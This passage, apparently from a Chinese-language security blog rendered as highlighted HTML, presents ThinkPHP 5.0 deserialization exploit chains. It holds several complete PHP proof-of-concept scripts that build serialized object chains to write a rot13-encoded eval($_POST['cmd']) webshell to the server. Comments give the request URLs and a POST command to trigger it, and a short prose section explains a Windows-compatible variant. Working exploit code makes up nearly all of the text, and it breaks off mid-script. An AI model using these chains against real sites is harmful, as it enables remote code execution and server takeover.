+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">/*
+handler可控，调用set，这里选择去调用File类的set方法。
+所以控制handler=new File();!!!
+*/</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcache</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">/*
+利用setTagItem()方法控制filename和data。
+setTagItem()方法在Driver类里，而File类继承了Driver类，有Driver类的属性和方法。
+setTagItem()方法的第一个if要tag属性不为空，我们随便给一个值:$tag='hacker';!!!
+$filename来自getCacheKey()的返回值。
+getCacheKey()函数前两个if不用进去，所以控制options['cache_subdir']=false，options['prefix']=''。
+$filename与options['path']有关。所以控制options['path']=>'php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[\'pzq\']);?>'
+伪协议编码绕过exit()。
+*/</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$options</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tag</span><span class="token operator">=</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
+            <span class="token string single-quoted-string">'expire'</span>        <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'cache_subdir'</span>  <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'prefix'</span>        <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'path'</span>          <span class="token operator">=></span> <span class="token string single-quoted-string">'php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[\'pzq\']);?>'</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'data_compress'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
+        <span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>
+<span class="token variable">$windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">/*
+http://xxxxx/public/?s=/index/index/test&amp;c=序列化后的结果
+然后访问
+http://xxxxx/public/%3C%3Fcuc%20%40riny(%24_CBFG%5B'pzq'%5D)%3B%3F%3E9eb29dfe314054b3d7d41b9c9b3e938c.php
+POST：cmd=phpinfo();
+*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="linux下的poc-干净卫生版"><a href="#linux下的poc-干净卫生版" class="headerlink" title="linux下的poc(干净卫生版"></a>linux下的poc(干净卫生版</h2><p>linux下的tp5.0反序列化利用poc（干净卫生版）:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>BelongsTo</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getError'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">error</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BelongsTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">BelongsTo</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">selfRelation</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">query</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindAttr</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">model</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$styles</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcache</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$options</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tag</span><span class="token operator">=</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
+            <span class="token string single-quoted-string">'expire'</span>        <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'cache_subdir'</span>  <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'prefix'</span>        <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'path'</span>          <span class="token operator">=></span> <span class="token string single-quoted-string">'php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[\'pzq\']);?>'</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'data_compress'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
+        <span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>
+<span class="token variable">$windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">/*
+http://xxxxx/public/?s=/index/index/test&amp;c=序列化后的结果
+然后访问
+http://xxxxx/public/%3C%3Fcuc%20%40riny(%24_CBFG%5B'pzq'%5D)%3B%3F%3E9eb29dfe314054b3d7d41b9c9b3e938c.php
+POST：cmd=phpinfo();
+*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>为什么windows还不行呢，因为windows<strong>文件名</strong>不能包含“&lt;”、“?”、“&gt;”等字符，但我们在使用伪协议时使用了这几个字符，所以我们想在windows下利用这条pop链的话还需要想一些其他的办法，此时我们就需要寻找其他的地方去赋值文件名。</p>
+<p>在这里我们找的是think\cache\driver\Memcached的set()方法，即当程序走到Memcache.php中的write方法时我们不直接赋予$this-&gt;handle为File对象，而是赋值为cache中的Memcached对象。</p>
+<h2 id="win-linux通用poc"><a href="#win-linux通用poc" class="headerlink" title="win,linux通用poc"></a>win,linux通用poc</h2><p>Windows（linux、Win通用）下的tp5.0反序列化利用poc：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token comment">//tostring本来是触发Model类的，但是Model是抽象类，不能实例化。</span>
+<span class="token comment">//所以使用继承了Model的Pivot类</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>BelongsTo</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getError'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//!</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">error</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BelongsTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">BelongsTo</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">selfRelation</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">query</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindAttr</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">model</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$styles</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcache</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Memcached</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
+            <span class="token string single-quoted-string">'expire'</span>        <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'cache_subdir'</span>  <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'prefix'</span>        <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'data_compress'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'path'</span>          <span class="token operator">=></span> <span class="token string single-quoted-string">'php://filter/write=string.rot13/resource=./'</span><span class="token punctuation">,</span>
+        <span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+ 
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcached</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+ 
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
+            <span class="token string single-quoted-string">'expire'</span>   <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span>
